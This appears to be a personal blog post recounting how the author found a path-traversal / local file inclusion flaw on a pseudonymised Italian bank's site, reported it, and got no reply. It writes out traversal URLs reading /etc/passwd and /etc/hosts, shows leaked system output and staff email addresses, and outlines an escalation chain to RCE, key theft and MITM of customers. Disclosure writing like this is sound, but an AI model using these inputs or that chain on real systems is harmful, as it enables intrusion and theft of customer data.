---
published: true
title: How i found an LFI vulnerability on a major banking site
layout: post
---
![](https://cdn-images-1.medium.com/max/1600/1*uRPk2m9Rs_8lSuEleEpgLw.gif)

Well yes, the title is a bit clickbait but that's what exactly happened some weeks ago when i was bored on an italian banking website, let's call it MPBbanking.<br><br>
As always with "Great updates comes great responsability" for the Sysadmins that maintain such systems and that day since was their migration day from an old platform to a new one (from mpbbanking to youweb.bankmpb) i decided to explore what new features this portal has to offer... Just a few clicks and everything seems responsive and too cool to be good so i tried out the good'old LFI to be sure that everything was safe and configured correctly...  <br>
Types on the web browser URL: youweb.bankmpb.it/../../../../etc/passwd <br>
<br>
 Created by anaconda<br>
<br>
Users And Groups Exposed<br>
<br>
root:x:0:0:root:/root:/bin/bash<br>
bin:x:1:1:bin:/bin:/sbin/nologin<br>
daemon:x:2:2:daemon:/sbin:/sbin/nologin<br>
adm:x:3:4:adm:/var/adm:/sbin/nologin<br>
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br>
sync:x:5:0:sync:/sbin:/bin/sync<br>
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br>
halt:x:7:0:halt:/sbin:/sbin/halt<br>
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br>
operator:x:11:0:operator:/root:/sbin/nologin<br>
..<br>
..<br>
.<br>
<br>
At the beginning my reaction was like.. Well that must be a honeypot because they should have a real-badass Sysadmin(s) running HIDS/DPI/Sensors/Alerts & Monitoring every breath of any system in the radius<br>
of an entire DC.<br><br>
But then i said well what if they aren't so badass and missed that, so i type:  youweb.bankmpb.it/../../../../etc/hosts and then .. :
<br><br><br>
##########################<br>
#####ATTENZIONE !!<br>
##<br>
##FILE GESTITO DA PUPPET<br>
##NON MODIFICARE A MANO<br>
###########################<br>
#<br>
###########<br>
 VERONA<br>
###########<br>
options timeout:1 attempts:1<br>
search servizi *.group *.group *.zserver *.nexus<br>
nameserver *.*.5.25<br>
nameserver *.*.5.26<br>
nameserver *.*.140.25<br>
#nameserver *.*.140.26<br>
<br>
<br>
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4<br>
<br>
*.*.203.12	*.*.group	*<br>
<br>
<br><br><br>
Wow... we are dealing with a DevOpser (Master of Puppets)...and that is an LFI (*hacker-voice* "we are in", and i didn't even need my great tool inspect element to hack their JS/CSS).<br>
So i kept checking if i can find the contact of their Sysadmin to report him this vulnerability that could cost them $$ if exploited well.... *checking postfix conf for contact* :<br><br>
#trap decode to catch security attacks<br>
decode:		root<br>
<br>
#Person who should get root's mail<br>
#root:		marc<br>
#root:	 fabian.adam@mpbcorp-address.it,frank.life@mpbcorp-address.it <br>
<br><br><br>
Well if they should get root's mail then i'll contact them about this.<br>
The day after i got this "Macro" reply from "frank" :<br>
Good afternoon Sami,<br>
Thank you for the advisory.<br>
<br>
We have forwarded our email to the right departement that will analyse the context and take remedial action<br>
<br>
<br>
Best Regards,<br>
Frank<br>
<br>
Sent from my IBM Verse  <br>
<br>
<br>
Yep probably the "right departement" is his colleague next to him and he used this "Macro".<br>
<br>
<br>
Just some hours after this email they started to fix this LFI and no feedback.<br>
<br>
The next day i sent them another email (cc'ing some other colleagues email addresses) asking if they have any running "Whitehat/Bug bounty program" because if this is how they keep things secure even a script kiddie could find some interesting stuff in their systems.<br>
<br>
12 Days later  --> Still no reply --> What a great way to give feedback to fellow Sysadmin that helped out and reported to you a vulnerability in your systems.<br>
<br>
<br>
Yep, i know that MPBCORP is big and probably no one cares because i'm the only one (or someone else found out and was trying to hack you silently) that noticed this but what if they breached some serious data from your system and custumer data was at risk? <br>
<br>
<br>
What could have happened (From less to more skilled):<br>
-  Script kiddie tries to hack using any tool found on the net (% of compromise very low but ain't 100% sure on your security after i saw selinux on permissive)<br>
- "Simple" Hacker found out LFI on the site --> Sells directly this on 0day/exploit forums/deepweb makes some cash $$ even if doesn't show how to exploit the system<br>
- "Expert" Hacker silently gather all the system data for months and then plan for major data-breach & compromise of their infrastructure...Sysadmin: Come on.. LFI ain't so dangerous --> Just Google LFI to RCE  678.000 results in 0,80 seconds and after<br>
you gathered all the system information i think it's just a matter of time (wait for exploits to come out, discover your self or buy a 0day) to compromise the host. <br>
- "Pro" Hacker plans for his malicious plan of getting on his hands their SSL private key .pem file after he got RCE (Since he is "Pro" that what he does daily..that step will take him no time) <br>
   a) "Refactor" file permissions on .pem files<br>
   b) Download the .pem <br>
   c) MITM bank customers and get all their credentials on (W)LANS (Why not WAN.. if you have Ratted victim PC or compromised a router)<br>
   d) Massive blackhat profits<br>
<br>
<br>
Well that's it, fix at least your critical stuff and reply to contacts/abuse fellow Sysadmins.<br>
<br>
:Wq!:wq:WqESCESCESC:wq:wq:wq! CTRL+Z^C^C^C^C^C^C^C^C^C^^C^C<br>
[1]+  Stopped 		vi<br>
<br>
Sami<br>
 








